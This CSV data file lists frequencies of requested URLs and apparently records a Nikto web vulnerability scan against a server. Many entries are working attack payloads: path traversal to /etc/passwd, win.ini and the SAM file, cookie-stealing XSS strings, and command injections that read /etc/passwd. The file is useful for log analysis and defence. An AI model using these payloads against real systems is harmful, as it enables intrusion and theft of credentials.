Frequency,Resource
1,/SoundBridgeStatus.html
1,/article.php?article=4965&post=1111111111
1,cgiforum.pl?thesection=../../../../../../../../../../etc/passwd%00
1,/ganglia/
1,/../../../../winnt/repair/sam._
1,/nsn/..%5Cutil/dsbrowse.bas
1,/vgn/vr/Deleting
1,/yealink/
1,/shoppingdirectory/midicart.mdb
1,/launch.jsp?NFuse_Application=<script>alert('Vulnerable')</script>
1,/cgi-bin/story/story.pl?next=../../../../../../../../../../etc/passwd%00
1,get32.exe
1,/PDG_Cart/oder.log
1,/ca/..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5Cwinnt/%5C%5Cwin.ini
1,/index.php?page=../../../../../../../../../../etc/passwd
1,/sipura/
1,/esp?PAGE=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
2,/myadmin2/index.php
1,"/search.php?zoom_query=<script>alert(\""hello\"")</script>"
1,/cgi-sys/
1,/polycom/
1,/vgn/ppstats
1,/scripts/
1,/exchange/lib/GETREND.INC
1,/cgi-bin/whois/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,/cgi-bin/cgi_process
1,/cgi-bin/gm-authors.cgi
1,/cfg/
1,/imp/horde/test.php?mode=phpinfo
2,pbcgi.cgi?Nikto=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>
1,/cgi-bin/Count.cgi
1,/cgi-bin/technote/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../../../etc/passwd
1,bb-hist.sh?HISTFILE=../../../../../../../../../../etc/passwd
1,probecontrol.cgi?command=enable&userNikto=cancer&password=killer
1,/snom/
1,/administrator/gallery/uploadimage.php
1,pagelog.cgi
1,/phone/
1,/gallery/search.php?searchstring=<script>alert(document.cookie)</script>
1,vq/demos/respond.pl?<script>alert('Vulnerable')</script>
1,/~root
2,/cgi-bin/cgiwrap/~uucp
1,shop/orders/orders.txt
2,/cgi-bin/cgiwrap/~lp
1,/cgi-bin/cgiemail-1.4/cgicso?query=AAA
1,///etc/passwd
1,/cgi-bin/netauth.cgi?cmd=show&page=../../../../../../../../../../etc/passwd
1,/administrator/config.php
2,/cgi-bin/cgiwrap/~guest
1,/................../config.sys
1,/netget?sid=user&msg=300&file=../../../../../../../../../../etc/passwd
1,blog/
1,/.git/index
1,/~root/
1,/cgi-local/
1,/cgi-bin/commerce.cgi?page=../../../../../../../../../../etc/passwd%00index.html
1,/horde/imp/test.php
1,/cfdocs/exampleapp/docs/sourcewindow.cfm?Template=c:\boot.ini
2,/nikto-test-5C00ChAL.html
1,webspirs.cgi?sp.nextform=../../../../../../../../../../etc/passwd
1,/modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index
1,/TvLBvkHh.lst
1,/https-admserv/bin/index?/<script>alert(document.cookie)</script>
2,cgiwrap/~nobody4
1,/search.php?searchstring=<script>alert(document.cookie)</script>
1,store.cgi?StartID=../../../../../../../../../../etc/passwd%00.html
3,/%00/
1,14all.cgi?cfg=../../../../../../../../etc/passwd
1,/contents/extensions/asp/1
1,shop.cgi?page=../../../../../../../etc/passwd
1,/TvLBvkHh.gz
1,/jamdb/
1,/nosuchurl/%3E%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/cgi-bin/search.pl?Realm=All&Match=0&Terms=test&nocpp=1&maxhits=10&;Rank=<script>alert('Vulnerable')</script>
1,csLiveSupport.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/sqlqhit.asp
1,/cgi-bin/wconsole.dll
1,/cfdocs/expeval/exprcalc.cfm?OpenFilePath=c:\boot.ini
1,/farm/libs/modules/tween/tween.min.js
1,/vgn/jsp/errorpage
1,ezadmin.cgi
1,/cgi-bin/aglimpse
1,/TvLBvkHh.home
